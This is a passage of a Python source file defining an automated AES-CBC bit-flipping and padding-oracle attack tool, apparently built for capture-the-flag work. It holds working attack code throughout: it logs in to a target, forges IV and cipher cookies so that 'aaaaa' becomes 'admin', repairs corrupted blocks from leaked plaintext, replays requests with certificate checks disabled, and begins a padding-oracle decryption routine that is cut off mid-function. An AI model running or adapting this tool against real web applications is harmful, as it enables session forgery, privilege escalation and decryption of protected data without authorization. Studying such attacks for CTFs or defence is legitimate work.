# -*- coding: utf-8 -*-
"""AES-CBC 字节翻转攻击 / Padding Oracle 通用工具。

块长固定 16（AES-128/192/256 的 CBC 翻转与 Padding Oracle 数学完全相同，与密钥长度无关）。

三种模式：
1. flip（本地计算）：已知明文模板 + 原片段/目标片段（等长）→ 翻转指令、
   翻转后密文/IV；提供泄露明文时可计算补偿 IV 修复被连带破坏的块。
2. attack（在线翻转 + 泄露补偿）：登录/任意请求获取 iv/cipher（Set-Cookie
   或响应体正则捕获）→ 应用翻转 → 利用服务端泄露的解密明文逐块级联补偿
   （块 0 用 IV）→ 重放并匹配成功标志。
3. oracle（PKCS7 Padding Oracle）：对每个密文块做 ≤256×16 次探测恢复完整
   明文（含末字节误报排除），恢复出的明文可直接作为 1/2 模式的模板。

通用能力：
- 输入/输出编码 base64 / hex / raw（auto=先 base64 后 hex 探测）
- iv_in_cipher：密文值本身 = iv‖ct（前 16 字节为 IV），无需独立 IV 字段
- attack 的 iv/cipher 来源：Set-Cookie 或登录响应体正则捕获
- attack 重放通道：参数占位符 {iv}/{cipher}（走表单/查询串）或 Cookie 名
- 独立重放端点、可选会话 Cookie、附加 Cookie、指数退避重试
- 目标片段全部在块 0 时只改 IV，无需任何泄露即可完成

原理：P[i] = D(C[i]) ^ C[i-1]（C[-1]=IV）。
翻转 C[j-1][o] 按位翻转 P[j][o]，但 D(C[j-1]) 雪崩使整块 P[j-1] 变垃圾，
需由高到低逐块修复（用泄露/恢复出的明文算 Δ），块 0 用 IV 补偿。
"""
from __future__ import annotations

import asyncio
import base64
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request

from app.core.registry import register_tool
from app.core.tool import Category, ParamSpec, Status, Tool, ToolContext, ToolResult

BLOCK = 16

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

DEFAULT_LEAK_RE = r"base64_decode\('([A-Za-z0-9+/=]+)'\)"
DEFAULT_SUCCESS_RE = r"flag\{[^}]+\}"

ENCS = ("auto", "base64", "hex", "raw")


# ---------------------------------------------------------------------------
# 小工具函数
# ---------------------------------------------------------------------------

def _b64d(s: str) -> bytes:
    """宽松 base64 解码：容忍 URL 编码、缺 padding。"""
    s = urllib.parse.unquote(s.strip())
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def _b64e(b: bytes) -> str:
    return base64.b64encode(b).decode()


def _out_label(enc: str) -> str:
    """报告行里显示的输出编码名（auto 输出为 base64）。"""
    return "base64" if enc in ("auto", "base64") else enc


def _decode_material(s: str, enc: str = "auto") -> bytes:
    """解码用户提供的密文/IV/泄露材料。auto = 先 base64 后 hex 探测。"""
    s = (s or "").strip()
    if not s:
        raise ValueError("材料为空")
    if enc == "base64":
        try:
            return _b64d(s)
        except Exception as e:
            raise ValueError(f"base64 解码失败: {e}")
    if enc == "hex":
        try:
            return bytes.fromhex(s)
        except Exception as e:
            raise ValueError(f"hex 解码失败: {e}")
    if enc == "raw":
        return s.encode("latin-1")
    # auto：先 base64，失败再 hex
    try:
        return _b64d(s)
    except Exception:
        try:
            return bytes.fromhex(s)
        except Exception as e:
            raise ValueError(f"材料既不是合法 base64 也不是 hex: {e}")


def _encode_material(b: bytes, enc: str = "auto") -> str:
    if enc == "hex":
        return b.hex()
    if enc == "raw":
        return b.decode("latin-1")
    return _b64e(b)  # auto → base64


def _encodings(name: str) -> str:
    return {"ascii": "ascii", "latin-1": "latin-1", "utf-8": "utf-8"}.get(name, "ascii")


def _parse_setcookie(headers: list[str]) -> dict[str, str]:
    """解析 Set-Cookie 头（多个），值做 urldecode 还原（PHP setcookie 会编码）。"""
    out: dict[str, str] = {}
    for h in headers or []:
        part = h.split(";", 1)[0]
        if "=" not in part:
            continue
        k, v = part.split("=", 1)
        out[k.strip()] = urllib.parse.unquote(v.strip())
    return out


def _cookie_header(cookies: dict[str, str]) -> str:
    """组装 Cookie 头。base64 值必须 quote（PHP $_COOKIE 会把 + 解码成空格）。"""
    return "; ".join(f"{k}={urllib.parse.quote(str(v), safe='')}" for k, v in cookies.items())


def _request(url: str, method: str = "GET", pairs: str = "",
             cookies: dict[str, str] | None = None, timeout: int = 15
             ) -> tuple[int, str, dict[str, str]]:
    """发送 HTTP 请求；pairs 为 a=1&b=2 格式（GET 并查询串 / POST 并表单）。返回 (状态码, 响应体, Set-Cookie)。"""
    qs = urllib.parse.urlencode(urllib.parse.parse_qsl(pairs, keep_blank_values=True))
    data = None
    if method.upper() == "GET":
        if qs:
            url = url + ("&" if "?" in url else "?") + qs
    else:
        data = qs.encode() if qs else None
    headers = {}
    if cookies:
        headers["Cookie"] = _cookie_header(cookies)
    req = urllib.request.Request(url, data=data, method=method.upper(), headers=headers)
    with urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX) as resp:
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
        new_cookies = _parse_setcookie(resp.headers.get_all("Set-Cookie") or [])
    return status, body, new_cookies


def _request_noraise(url: str, method: str = "GET", pairs: str = "",
                     cookies: dict[str, str] | None = None, timeout: int = 15
                     ) -> tuple[int, str, dict[str, str]]:
    """同 _request，但 4xx/5xx 不抛异常（HTTPError 也作为响应返回）。"""
    try:
        return _request(url, method, pairs, cookies, timeout)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace"), {}


def _excerpt(text: str, n: int = 160) -> str:
    t = re.sub(r"\s+", " ", text).strip()
    return t[:n] + ("…" if len(t) > n else "")


# ---------------------------------------------------------------------------
# 工具
# ---------------------------------------------------------------------------

@register_tool
class AesCbcBitflipTool(Tool):
    name = "aes_cbc_bitflip"
    category = Category.CRYPTO
    version = "1.1.0"
    timeout = 900
    description = (
        "AES-CBC 字节翻转攻击通用工具：本地计算翻转密文/IV（含泄露补偿）、"
        "在线翻转+泄露级联补偿攻击（iv/cipher 可来自 Cookie 或响应体）、"
        "PKCS7 Padding Oracle 全明文恢复。"
    )

    params = [
        ParamSpec("mode", type="str", required=False, default="flip",
                  description="flip=本地计算 / attack=在线翻转+泄露补偿 / oracle=Padding Oracle 恢复明文"),
        # —— 明文与目标（flip / attack）——
        ParamSpec("plaintext", type="text", required=False, default="",
                  description="加密前的完整已知明文（模板），工具在其中定位原片段"),
        ParamSpec("orig", type="str", required=False, default="",
                  description="要替换的原片段（如 aaaaa）"),
        ParamSpec("target", type="str", required=False, default="",
                  description="目标片段，必须与原片段等长（如 admin）"),
        ParamSpec("encoding", type="str", required=False, default="ascii",
                  description="明文字节编码：ascii / latin-1 / utf-8"),
        # —— 材料（flip / oracle 共用）——
        ParamSpec("cipher_b64", type="text", required=False, default="",
                  description="密文（base64/hex/raw，按 input_encoding；iv_in_cipher 时为 iv‖ct）"),
        ParamSpec("iv_b64", type="text", required=False, default="",
                  description="独立 IV 16 字节（可选；iv_in_cipher 时忽略）"),
        ParamSpec("leaked_b64", type="text", required=False, default="",
                  description="首次翻转后服务器泄露的解密明文（flip 模式补偿用）"),
        ParamSpec("input_encoding", type="str", required=False, default="auto",
                  description="输入材料（cipher/iv/leaked/target）编码：auto / base64 / hex / raw"),
        ParamSpec("iv_in_cipher", type="bool", required=False, default=False,
                  description="密文值本身 = iv‖ct（前 16 字节为 IV），无需独立 IV 字段"),
        # —— attack 在线攻击 ——
        ParamSpec("login_url", type="str", required=False, default="",
                  description="登录端点（拿 iv/cipher；无独立重放端点时也在此重放）"),
        ParamSpec("login_method", type="str", required=False, default="POST",
                  description="登录请求方法 POST/GET"),
        ParamSpec("login_params", type="text", required=False, default="",
                  description="登录参数，格式 a=1&b=2（POST 为表单，GET 为查询串）"),
        ParamSpec("replay_url", type="str", required=False, default="",
                  description="重放端点，留空与 login_url 相同"),
        ParamSpec("replay_method", type="str", required=False, default="GET",
                  description="重放校验请求方法"),
        ParamSpec("replay_params", type="text", required=False, default="",
                  description="重放附加参数，支持 {iv}/{cipher} 占位符（走表单/查询串）；"
                              "无占位符时值走 Cookie 名"),
        ParamSpec("session_cookie", type="str", required=False, default="PHPSESSID",
                  description="会话 Cookie 名；留空则不携带会话 Cookie"),
        ParamSpec("iv_cookie", type="str", required=False, default="iv",
                  description="IV Cookie 名（source_type=cookie 时使用）"),
        ParamSpec("cipher_cookie", type="str", required=False, default="cipher",
                  description="密文 Cookie 名（source_type=cookie 时使用）"),
        ParamSpec("source_type", type="str", required=False, default="cookie",
                  description="iv/cipher 来源：cookie=Set-Cookie / body=登录响应体正则捕获 / manual=手动填写"),
        ParamSpec("iv_body_regex", type="text", required=False, default="",
                  description="source_type=body 时从登录响应捕获 IV 的正则（捕获组 1）"),
        ParamSpec("cipher_body_regex", type="text", required=False, default="",
                  description="source_type=body 时从登录响应捕获密文的正则（捕获组 1）"),
        ParamSpec("manual_iv", type="text", required=False, default="",
                  description="source_type=manual 时手动填写的 IV 值（按 value_encoding 解析；iv_in_cipher 时忽略）"),
        ParamSpec("manual_cipher", type="text", required=False, default="",
                  description="source_type=manual 时手动填写的密文值（按 value_encoding 解析；iv_in_cipher 时为 iv‖ct）"),
        ParamSpec("value_encoding", type="str", required=False, default="auto",
                  description="捕获与重放的 iv/cipher 值编码：auto / base64 / hex / raw"),
        ParamSpec("extra_cookies", type="text", required=False, default="",
                  description="每次请求追加的 Cookie（a=1&b=2），支持 {iv}/{cipher} 占位符"),
        ParamSpec("leak_regex", type="text", required=False, default=DEFAULT_LEAK_RE,
                  description="泄露解密明文的正则（捕获组 1），如 14607 的 die(base64_encode) 格式"),
        ParamSpec("leak_encoding", type="str", required=False, default="base64",
                  description="泄露值编码：base64 / hex / raw"),
        ParamSpec("success_regex", type="text", required=False, default=DEFAULT_SUCCESS_RE,
                  description="成功标志正则，重放后在其中匹配 flag 等"),
        ParamSpec("interval", type="float", required=False, default=0,
                  description="请求间隔（秒），目标有限速时设置（attack/oracle）"),
        ParamSpec("retries", type="int", required=False, default=3,
                  description="瞬时错误（连接失败/未解析到泄露）自动重试次数，指数退避（attack/oracle）"),
        # —— oracle 模式（Padding Oracle）——
        ParamSpec("oracle_url", type="str", required=False, default="",
                  description="Padding Oracle 端点（有效/无效填充响应有差异）"),
        ParamSpec("oracle_method", type="str", required=False, default="GET",
                  description="Oracle 请求方法 GET/POST"),
        ParamSpec("oracle_params", type="text", required=False, default="",
                  description="Oracle 请求参数，{payload} 占位符替换为构造的 iv′‖C 值（如 token={payload}）"),
        ParamSpec("oracle_cookie", type="str", required=False, default="",
                  description="把 payload 放进这个 Cookie（与 oracle_params 可同时用）"),
        ParamSpec("oracle_ok_regex", type="text", required=False, default="",
                  description="响应匹配此正则 = 填充有效（与 oracle_ok_status 为 AND 关系）"),
        ParamSpec("oracle_ok_status", type="int", required=False, default=0,
                  description="HTTP 状态码命中 = 填充有效（0=不按状态码判定）"),
        ParamSpec("oracle_invert", type="bool", required=False, default=False,
                  description="反转判定：匹配/命中 = 填充无效"),
        ParamSpec("target_cipher", type="text", required=False, default="",
                  description="oracle 模式要恢复的密文；留空用 cipher_b64"),
    ]

    def validate_params(self, params: dict) -> dict:
        # 先按 ParamSpec 声明全量填默认值（与基类一致），保证 run() 里下标访问不 KeyError
        p: dict = {spec.name: spec.default for spec in self.params}
        p.update(params)
        p.setdefault("mode", "flip")
        p.setdefault("encoding", "ascii")
        p.setdefault("input_encoding", "auto")
        p.setdefault("value_encoding", "auto")
        p.setdefault("leak_encoding", "base64")
        p.setdefault("login_method", "POST")
        p.setdefault("replay_method", "GET")
        p.setdefault("session_cookie", "PHPSESSID")
        p.setdefault("iv_cookie", "iv")
        p.setdefault("cipher_cookie", "cipher")
        p.setdefault("source_type", "cookie")
        p.setdefault("manual_iv", "")
        p.setdefault("manual_cipher", "")
        p.setdefault("leak_regex", DEFAULT_LEAK_RE)
        p.setdefault("success_regex", DEFAULT_SUCCESS_RE)
        p.setdefault("interval", 0)
        p.setdefault("retries", 3)
        p.setdefault("oracle_method", "GET")
        p.setdefault("oracle_ok_status", 0)
        p.setdefault("iv_in_cipher", False)
        p.setdefault("oracle_invert", False)
        if p["mode"] not in ("flip", "attack", "oracle"):
            raise ValueError(f"未知模式: {p['mode']}（flip / attack / oracle）")
        if p["input_encoding"] not in ENCS or p["value_encoding"] not in ENCS:
            raise ValueError(f"编码必须是 {ENCS} 之一")
        if p["leak_encoding"] not in ("base64", "hex", "raw"):
            raise ValueError("leak_encoding 必须是 base64/hex/raw")
        if p["mode"] in ("flip", "attack"):
            if not p.get("plaintext"):
                raise ValueError("flip/attack 模式必须提供已知明文 plaintext")
            if not p.get("orig") or not p.get("target"):
                raise ValueError("必须提供原片段 orig 与目标片段 target")
            if len(p["orig"]) != len(p["target"]):
                raise ValueError(
                    f"原片段与目标片段必须等长（{len(p['orig'])} != {len(p['target'])}）；"
                    "CBC 翻转不能改变长度字段，如 'aaaaa' → 'admin'")
        if p["mode"] == "attack":
            if p["source_type"] not in ("cookie", "body", "manual"):
                raise ValueError("source_type 必须是 cookie / body / manual")
            if p["source_type"] == "manual":
                if not p.get("manual_cipher"):
                    raise ValueError("source_type=manual 时必须提供 manual_cipher")
                if not p["iv_in_cipher"] and not p.get("manual_iv"):
                    raise ValueError("source_type=manual 且未勾选 iv_in_cipher 时必须提供 manual_iv")
                if not (p.get("login_url") or p.get("replay_url")):
                    raise ValueError("source_type=manual 时必须提供 replay_url 或 login_url 作为重放端点")
            else:
                if not p.get("login_url"):
                    raise ValueError("attack 模式必须提供登录端点 login_url"
                                     "（source_type=manual 时改为填写 manual_iv/manual_cipher）")
                if p["source_type"] == "body":
                    if not p.get("cipher_body_regex"):
                        raise ValueError("source_type=body 时必须提供 cipher_body_regex")
                    if not p["iv_in_cipher"] and not p.get("iv_body_regex"):
                        raise ValueError("source_type=body 且未勾选 iv_in_cipher 时必须提供 iv_body_regex")
        if p["mode"] == "oracle":
            if not p.get("oracle_url"):
                raise ValueError("oracle 模式必须提供 oracle_url")
            if not (p.get("oracle_ok_regex") or int(p.get("oracle_ok_status") or 0)):
                raise ValueError("oracle 模式必须提供 oracle_ok_regex 或 oracle_ok_status")
            if not (p.get("target_cipher") or p.get("cipher_b64")):
                raise ValueError("oracle 模式必须提供 target_cipher（或 cipher_b64）")
        return p

    # ------------------------------------------------------------------
    # 核心计算：定位 + Δ 分段 + 期望明文
    # ------------------------------------------------------------------

    def _locate(self, params: dict, report: list[str]):
        enc = _encodings(params["encoding"])
        try:
            plain = params["plaintext"].encode(enc)
        except UnicodeEncodeError as e:
            raise ValueError(f"明文无法用 {enc} 编码: {e}")
        orig = params["orig"].encode(enc)
        target = params["target"].encode(enc)
        if len(orig) != len(target):
            raise ValueError(
                f"原片段与目标片段编码后字节数不等（{len(orig)} != {len(target)}）；"
                "CBC 翻转只能等长替换，如 'aaaaa' → 'admin'")
        pos = plain.find(orig)
        if pos < 0:
            raise ValueError(
                f"在已知明文里找不到原片段 {orig!r}；"
                "请确认明文模板与服务器加密前的内容一致（含序列化/JSON 结构）")
        cnt = plain.count(orig)
        if cnt > 1:
            report.append(f"[定位] 原片段出现 {cnt} 次，取第 1 处")
        report.append(f"[定位] 片段 {orig!r} → {target!r}，明文字节 {pos}~{pos + len(orig) - 1}")

        # 期望明文 = 原明文把目标片段逐字节替换
        desired = bytearray(plain)
        segs: list[tuple[int, int, int, int, int]] = []  # (目标块 j, 块内偏移 o, Δ, 原字节, 目标字节)
        for i in range(len(orig)):
            d = orig[i] ^ target[i]
            if d:
                desired[pos + i] ^= d
                segs.append(((pos + i) // BLOCK, (pos + i) % BLOCK, d, orig[i], target[i]))
        if not segs:
            raise ValueError("原片段与目标片段完全相同，没有需要翻转的字节")

        nb = (len(plain) + BLOCK - 1) // BLOCK
        padded_len = nb * BLOCK
        pp = plain.ljust(padded_len, b"\x00")
        dd = bytes(desired).ljust(padded_len, b"\x00")

        changed = sorted({j for j, *_ in segs})             # 需要修改的目标块
        corrupted = sorted({j - 1 for j in changed if j >= 1}, reverse=True)  # 被连带破坏的块
        return pp, dd, segs, changed, corrupted, nb

    def _describe_flip(self, segs: list[tuple[int, int, int, int, int]], report: list[str]):
        """输出翻转说明（flip/attack 共用）。"""
        for j, o, d, ob, tb in segs:
            target_name = "IV" if j == 0 else f"C[{j - 1}]"
            report.append(f"[翻转] {target_name}[{o:>2}] ^= {d:#04x}"
                          f"（明文字节 {j * BLOCK + o}: {ob:#04x} {chr(ob)!r} → {tb:#04x} {chr(tb)!r}）")

    # ------------------------------------------------------------------
    # flip 模式：本地计算
    # ------------------------------------------------------------------

    def _run_flip(self, params: dict, report: list[str]) -> None:
        pp, dd, segs, changed, corrupted, nb = self._locate(params, report)
        report.append(f"[明文] {nb} 块（每块 16 字节），目标块: {', '.join(map(str, changed))}")
        self._describe_flip(segs, report)

        if corrupted:
            names = ", ".join(f"块 {c}" for c in corrupted)
            report.append(
                f"[警告] 翻转 C[j-1] 会连带把块 j-1 整体破坏（D 值雪崩）：受影响的块 = {names}；"
                "块 0 可用 IV 补偿，块 ≥1 需要泄露明文逐级补偿（attack 模式）或先用 oracle 模式恢复明文")
        else:
            report.append("[结果] 目标全部位于块 0：直接改 IV 即可，无块被连带破坏，无需补偿")

        ie = params["input_encoding"]
        ol = _out_label(ie)
        in_cipher = bool(params["iv_in_cipher"])

        # —— 材料解码 ——
        raw = None
        if params.get("cipher_b64"):
            raw = bytearray(_decode_material(params["cipher_b64"], ie))
        cb: bytearray | None = None
        ivb: bytearray | None = None
        if raw is not None:
            if in_cipher:
                if len(raw) < BLOCK + nb * BLOCK:
                    raise ValueError(f"密文（iv‖ct）仅 {len(raw)} 字节，不足以覆盖 {nb} 块明文")
                ivb, cb = raw[:BLOCK], raw[BLOCK:]
            else:
                if len(raw) < nb * BLOCK:
                    raise ValueError(f"密文仅 {len(raw)} 字节，不足以覆盖 {nb} 块明文")
                cb = raw
        if ivb is None and params.get("iv_b64"):
            ivb = bytearray(_decode_material(params["iv_b64"], ie))
            if len(ivb) != BLOCK:
                raise ValueError(f"IV 必须 16 字节（现 {len(ivb)}）")

        # —— 应用翻转（j>=1 翻密文，j==0 翻 IV）——
        if cb is not None:
            for j, o, d, _ob, _tb in segs:
                if j >= 1:
                    cb[(j - 1) * BLOCK + o] ^= d
        if ivb is not None:
            for j, o, d, _ob, _tb in segs:
                if j == 0:
                    ivb[o] ^= d
            if 0 in changed:
                if in_cipher:
                    report.append("[IV] 块 0 翻转已并入 iv‖ct 前 16 字节（见下方密文输出）")
                else:
                    report.append(f"[IV] 块 0 直接翻转后的 iv（{ol}）: {_encode_material(bytes(ivb), ie)}")

        # —— 输出翻转后密文 ——
        if cb is not None:
            if in_cipher:
                combined = bytes(ivb) + bytes(cb)
                report.append(f"[密文] 翻转后 iv‖ct（{ol}）: {_encode_material(combined, ie)}")
            else:
                report.append(f"[密文] 翻转后 cipher（{ol}）: {_encode_material(bytes(cb), ie)}")

        # —— 泄露补偿（修复块 0）——
        leaked = None
        if params.get("leaked_b64"):
            leaked = _decode_material(params["leaked_b64"], ie)

        if leaked is not None and ivb is not None:
            if corrupted and corrupted != [0]:
                report.append(
                    f"[补偿] 泄露明文已提供，但被破坏的块为 {corrupted}（不止块 0），"
                    "每修复一个块都会产生新的垃圾块，需要每次泄露——请改用 attack 模式在线完成")
            elif corrupted == [0]:
                g0 = leaked[:BLOCK]
                want = dd[:BLOCK]
                iv_new = bytes(a ^ b ^ c for a, b, c in zip(ivb, g0, want))
                report.append(f"[补偿] 块 0 垃圾 = {g0!r}")
                report.append(f"[补偿] IV_new = IV ^ 垃圾 ^ 期望前缀 = {_encode_material(iv_new, ie)}"
                              f"（与翻转后密文搭配重放即可）")
                if cb is not None:
                    report.append("[重放] 最终 Cookie（可直接复制）:")
                    if in_cipher:
                        combined = iv_new + bytes(cb)
                        report.append(f"  └─ cipher={urllib.parse.quote(_encode_material(combined, ie), safe='')}")
                    else:
                        report.append(
                            f"  └─ iv={urllib.parse.quote(_encode_material(iv_new, ie), safe='')}; "
                            f"cipher={urllib.parse.quote(_encode_material(bytes(cb), ie), safe='')}")
        elif corrupted == [0] and cb is not None:
            if ivb is None:
                report.append("[提示] 块 0 被破坏但未提供 IV 与泄露明文，无法计算补偿；"
                              "提供 iv_b64 + leaked_b64，或改用 attack 模式")
            else:
                report.append("[提示] 块 0 被破坏但未提供泄露明文，无法计算补偿 IV；"
                              "提供 leaked_b64，或改用 attack/oracle 模式")

    # ------------------------------------------------------------------
    # attack 模式：在线翻转 + 泄露级联补偿
    # ------------------------------------------------------------------

    async def _run_attack(self, params: dict, report: list[str]) -> None:
        interval = float(params.get("interval") or 0)
        retries = max(1, int(params.get("retries") or 3))
        url = params["login_url"].rstrip("/")
        replay_url = (params.get("replay_url") or "").rstrip("/") or url
        ve = params["value_encoding"]
        in_cipher = bool(params["iv_in_cipher"])

        async def req_retry(label: str, *args, **kwargs):
            """瞬时错误（5xx / 连接失败）指数退避重试；4xx 直接抛。"""
            last: Exception | None = None
            for attempt in range(retries):
                try:
                    return await asyncio.to_thread(_request, *args, **kwargs)
                except urllib.error.HTTPError as e:
                    if e.code < 500:
                        raise
                    last = e
                except (urllib.error.URLError, TimeoutError, ConnectionError, OSError) as e:
                    last = e
                if attempt + 1 < retries:
                    wait = 2 ** attempt
                    report.append(
                        f"[重试] {label} {type(last).__name__}: {last}"
                        f"（第 {attempt + 1}/{retries} 次失败），{wait}s 后重试")
                    await asyncio.sleep(wait)
            raise last  # type: ignore[misc]

        # 1) 登录/获取请求（manual 模式可不登录，直接用填写的值；给 login_url 时仍登录以抓会话 Cookie）
        cookies: dict[str, str] = {}
        body = ""
        setck: dict[str, str] = {}
        if url:
            status, body, setck = await req_retry(
                "登录", url, params["login_method"], params["login_params"])
            report.append(f"[登录] {params['login_method']} {url}（{params['login_params'] or '无参数'}）→ HTTP {status}")
            report.append(f"[登录] Set-Cookie: {', '.join(setck) or '无'}")
            if params["session_cookie"]:
                if params["session_cookie"] in setck:
                    cookies[params["session_cookie"]] = setck[params["session_cookie"]]
                else:
                    report.append(f"[提示] 登录响应未发现会话 Cookie {params['session_cookie']}，继续重放")
        else:
            report.append("[材料] 手动来源：跳过登录，直接使用 manual_iv / manual_cipher")

        # 2) 获取 iv / cipher
        if params["source_type"] == "manual":
            iv_val = None if in_cipher else params["manual_iv"]
            ct_val = params["manual_cipher"]
        elif params["source_type"] == "cookie":
            for key in (params["cipher_cookie"],) if in_cipher else (params["iv_cookie"], params["cipher_cookie"]):
                if key in setck:
                    cookies[key] = setck[key]
            need = [params["cipher_cookie"]] if in_cipher else [params["iv_cookie"], params["cipher_cookie"]]
            missing = [k for k in need if k not in cookies]
            if missing:
                raise ValueError(f"登录响应缺少 Cookie: {missing}；收到的: {list(setck)}")
            iv_val = None if in_cipher else cookies[params["iv_cookie"]]
            ct_val = cookies[params["cipher_cookie"]]
        else:
            mct = re.search(params["cipher_body_regex"], body)
            miv = None if in_cipher else re.search(params["iv_body_regex"], body)
            if not mct or (not in_cipher and not miv):
                raise ValueError("未能用 iv_body_regex/cipher_body_regex 从登录响应捕获值；"
                                 "响应片段: " + _excerpt(body, 200))
            iv_val = None if in_cipher else miv.group(1)
            ct_val = mct.group(1)

        raw_ct = _decode_material(ct_val, ve)
        ivb = bytearray(raw_ct[:BLOCK]) if in_cipher else bytearray(_decode_material(iv_val, ve))
        cb = bytearray(raw_ct[BLOCK:]) if in_cipher else bytearray(raw_ct)
        if len(ivb) != BLOCK or len(cb) % BLOCK:
            raise ValueError(f"捕获值解码异常: iv={len(ivb)}B cipher={len(cb)}B（应为 16 的倍数）")
        report.append(f"[材料] iv={_encode_material(bytes(ivb), ve)} cipher={len(cb)}B（{len(cb) // BLOCK} 块）")

        # 3) 定位 + 期望明文
        pp, dd, segs, changed, corrupted, nb = self._locate(params, report)
        self._describe_flip(segs, report)

        # 4) 应用全部翻转
        for j, o, d, _ob, _tb in segs:
            if j == 0:
                ivb[o] ^= d
            else:
                cb[(j - 1) * BLOCK + o] ^= d

        # 5) 重放
        has_iv_ph = "{iv}" in params["replay_params"]
        has_ct_ph = "{cipher}" in params["replay_params"]
        extra = dict(urllib.parse.parse_qsl(params.get("extra_cookies") or "", keep_blank_values=True))

        def current_values() -> tuple[str, str]:
            iv_enc = _encode_material(bytes(ivb), ve)
            ct_enc = _encode_material(bytes(cb), ve)
            if in_cipher:
                return iv_enc, iv_enc + ct_enc  # {iv}=IV 部分；{cipher}=完整 iv‖ct
            return iv_enc, ct_enc

        async def send_and_report(label: str) -> str:
            """重放当前 iv/cipher，输出报告行，返回响应体。"""
            if interval:
                await asyncio.sleep(interval)
            iv_enc, ct_enc = current_values()
            params_str = params["replay_params"]
            if has_iv_ph or has_ct_ph:
                params_str = (params_str
                              .replace("{iv}", urllib.parse.quote(iv_enc, safe=''))
                              .replace("{cipher}", urllib.parse.quote(ct_enc, safe='')))
            send_cookies = dict(cookies)
            if in_cipher:
                if not has_ct_ph:
                    send_cookies[params["cipher_cookie"]] = ct_enc
            else:
                if not has_iv_ph:
                    send_cookies[params["iv_cookie"]] = iv_enc
                if not has_ct_ph:
                    send_cookies[params["cipher_cookie"]] = ct_enc
            extra_now = {k: v.replace("{iv}", iv_enc).replace("{cipher}", ct_enc)
                         for k, v in extra.items()}
            send_cookies = {**extra_now, **send_cookies}
            st, b, _ = await req_retry(
                label, replay_url, params["replay_method"], params_str, send_cookies)
            report.append(f"[{label}] {params['replay_method']} {replay_url}"
                          f"（{params_str or '仅 Cookie'}）→ HTTP {st}（{_excerpt(b)}）")
            report.append(f"  └─ Cookie: {_cookie_header(send_cookies) if send_cookies else '无'}")
            return b

        def parse_leak(body_text: str) -> bytes | None:
            m = re.search(params["leak_regex"], body_text)
            if not m:
                return None
            val = m.group(1)
            le = params["leak_encoding"]
            try:
                return _decode_material(val, "base64" if le == "base64" else le)
            except Exception:
                return None

        # 6) 首次重放
        body = await send_and_report("翻转重放")

        # 7) 级联补偿：从最高被破坏块向下逐级修复，块 0 用 IV
        if corrupted:
            pending = set(corrupted)
            while pending:
                b = max(pending)
                pending.discard(b)
                leaked = parse_leak(body)
                attempt = 0
                while (leaked is None or len(leaked) < (b + 1) * BLOCK) and attempt < retries:
                    wait = 2 ** attempt
                    report.append(
                        f"[重试] 响应未解析到泄露明文（需要块 {b}），{wait}s 后重发")
                    await asyncio.sleep(wait)
                    body = await send_and_report(f"泄露重试 {attempt + 1}")
                    leaked = parse_leak(body)
                    attempt += 1
                if leaked is None or len(leaked) < (b + 1) * BLOCK:
                    raise ValueError(
                        f"未从响应解析到泄露明文（需要块 {b} 的垃圾值）。"
                        f"检查 leak_regex/leak_encoding；响应片段: {_excerpt(body, 200)}")
                g = leaked[b * BLOCK:(b + 1) * BLOCK]
                want = dd[b * BLOCK:(b + 1) * BLOCK]
                delta = bytes(x ^ y for x, y in zip(g, want))
                if b == 0:
                    ivb[:] = bytes(x ^ y for x, y in zip(ivb, delta))
                    report.append(f"[补偿] 块 0 垃圾 {g!r} → IV ^= Δ（恢复期望前缀）")
                    body = await send_and_report("IV 补偿重放")
                else:
                    for i in range(BLOCK):
                        cb[(b - 1) * BLOCK + i] ^= delta[i]
                    report.append(f"[补偿] 块 {b} 垃圾 → 翻转 C[{b - 1}] 修复（连带破坏块 {b - 1}）")
                    body = await send_and_report(f"修复块 {b}")
                    pending.add(b - 1)

        # 8) 成功标志
        m = re.search(params["success_regex"], body)
        if m:
            report.append(f"[成功] {m.group(0)}")
        else:
            report.append("[结果] 未匹配成功标志，响应片段:")
            report.append("  └─ " + _excerpt(body, 300))
            report.append("[提示] 检查 success_regex / 目标判定条件（如 'Hello admin'）")

    # ------------------------------------------------------------------
    # oracle 模式：PKCS7 Padding Oracle 全明文恢复
    # ------------------------------------------------------------------

    async def _run_oracle(self, params: dict, report: list[str]) -> None:
        interval = float(params.get("interval") or 0)
        retries = max(1, int(params.get("retries") or 3))
        url = params["oracle_url"].rstrip("/")
        ve = params["value_encoding"]
        ie = params["input_encoding"]
        in_cipher = bool(params["iv_in_cipher"])

        async def req_retry(label: str, *args, **kwargs):
            """连接级错误退避重试；HTTP 错误码经 _request_noraise 作为 oracle 响应返回。"""
            last: Exception | None = None
            for attempt in range(retries):
                try:
                    return await asyncio.to_thread(_request_noraise, *args, **kwargs)
                except (urllib.error.URLError, TimeoutError, ConnectionError, OSError) as e:
                    last = e
                    if attempt + 1 < retries:
                        wait = 2 ** attempt
                        report.append(
                            f"[重试] {label} {type(e).__name__}: {e}"
                            f"（第 {attempt + 1}/{retries} 次失败），{wait}s 后重试")
                        await asyncio.sleep(wait)
            raise last  # type: ignore[misc]

        # 目标密文与 IV
        tgt = params.get("target_cipher") or params.get("cipher_b64")
        raw = _decode_material(tgt, ie)
        ivb: bytearray | None = None
        if params.get("iv_b64"):
            ivb = bytearray(_decode_material(params["iv_b64"], ie))
        if in_cipher:
            if len(raw) < 2 * BLOCK:
                raise ValueError("iv_in_cipher 时密文（iv‖ct）至少 32 字节")
            ivb = bytearray(raw[:BLOCK])
            raw = raw[BLOCK:]
        if len(raw) % BLOCK:
            raise ValueError(f"目标密文长度 {len(raw)} 不是 16 的倍数")
        if ivb is not None and len(ivb) != BLOCK:
            raise ValueError(f"IV 必须 16 字节（现 {len(ivb)}）")
        blocks = [raw[i:i + BLOCK] for i in range(0, len(raw), BLOCK)]
        report.append(f"[目标] 密文 {len(blocks)} 块（{len(raw)}B）"
                      + ("，已提供 IV，可恢复块 0" if ivb is not None else "，未提供 IV，跳过块 0"))

        ok_re = re.compile(params["oracle_ok_regex"]) if params.get("oracle_ok_regex") else None
        ok_status = int(params.get("oracle_ok_status") or 0) or None
        invert = bool(params.get("oracle_invert"))
        extra = dict(urllib.parse.parse_qsl(params.get("extra_cookies") or "", keep_blank_values=True))
